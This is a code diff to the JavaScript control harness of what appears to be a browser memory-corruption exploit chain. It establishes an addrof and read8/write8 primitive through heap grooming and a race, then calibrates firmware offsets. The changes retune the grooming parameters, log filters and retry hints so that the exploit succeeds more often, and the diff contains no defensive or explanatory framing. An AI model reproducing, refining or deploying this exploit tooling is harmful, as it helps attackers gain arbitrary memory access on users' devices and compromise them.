@@ -16,8 +16,8 @@ let calibratedOff = null;
 let probeCache = null;
 let logQuiet = 0;
 
-const CORE_LOG = /FAIL|ERROR|THREW|RETRY|ABORT|PASS|GIVE-UP|ATTEMPT|SSV-|AUTO-RETRY|CORE-GIVE|COMPOSITION|PRIMITIVE/i;
-const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS|GIVE-UP/i;
+const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-STORED/i;
+const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|ABORT|PASS|GIVE-UP|PRIMITIVE|ADDROF-FAIL|ADDROF-NO/i;
 
 const SCAN_YIELD_EVERY = 8;
 const LOG_MAX = 400;
@@ -591,11 +591,17 @@ async function runEstablish() {
         return;
     }
 
+    if (lines.length > 40) {
+        lines.splice(0, lines.length - 40);
+        renderLog();
+    }
+    logQuiet++;
+
     const { establishPrimitive, installWindowP, pairStatus } = await loadExploit();
     const maxAttempts = maxAttemptsPick();
 
     state("establishing primitive...", "warn");
-    mark("STEP", "1 - get primitive");
+    mark("STEP", "1 - get primitive (12M slots, lite groom)");
     mark("ATTEMPTS", String(maxAttempts));
 
     let carrier;
@@ -607,9 +613,11 @@ async function runEstablish() {
         });
     } catch (err) {
         if (/gave up/i.test(String(err.message))) {
-            mark("HINT", "race lost — close browser, reopen, tries=3");
+            mark("HINT", "race lost — close browser fully, reopen, tries=3");
         }
         throw err;
+    } finally {
+        logQuiet--;
     }
 
     installWindowP(carrier, {
@@ -637,23 +645,9 @@ async function runEstablish() {
     p.write8(addrA, headerA);
     check("read8-write8-roundtrip-header", same64(p.read8(addrA), headerA), "");
 
-    const offKey = resolvedOffKey();
-    const { off } = offsetsForKey(offKey);
-    if (off) {
-        logQuiet++;
-        try {
-            calibrateLiteSync(p, off);
-        } finally {
-            logQuiet--;
-        }
-    }
-
     saveSession();
-    if (calibratedOff)
-        state("primitive + calibrate OK — run step 2", "ok");
-    else
-        state("primitive OK — calibrate miss, check log", "warn");
-    mark("READY", calibratedOff ? "offsets live" : "CAL-FAIL — try FW dropdown or ?narrow=1");
+    state("primitive OK — run step 3 calibrate", "ok");
+    mark("READY", "calibrate is separate (step 3) to save memory");
 }
 
 async function runOffsetTests() {
@@ -784,8 +778,12 @@ function init() {
     btnLowMem.addEventListener("click", () => {
         saveSession();
         const url = new URL(location.href);
-        url.searchParams.set("g", "drain:256");
+        url.searchParams.set("clear", "1");
         url.searchParams.delete("slots");
+        url.searchParams.delete("g");
+        url.searchParams.append("g", "drain:192");
+        url.searchParams.append("g", "drainsz:32768");
+        url.searchParams.append("g", "slab:2097152");
         location.href = url.toString();
     });
 
